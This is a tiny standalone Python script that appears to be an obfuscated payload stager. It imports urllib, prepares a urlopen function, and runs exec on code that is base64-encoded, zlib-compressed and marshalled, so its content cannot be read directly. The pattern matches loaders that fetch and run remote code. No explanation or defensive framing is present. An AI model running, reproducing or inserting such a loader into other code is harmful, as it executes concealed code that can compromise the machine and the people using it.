import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrtmdgYCgtyskvSM3TUM8oKSmw0tfPyS9Kzc7M00tJySvWy0stsTI0NrbQ19cvLklMTy0q1i8IzNYrqFTX1CtKTUzR0AQA+J4WCw==')))))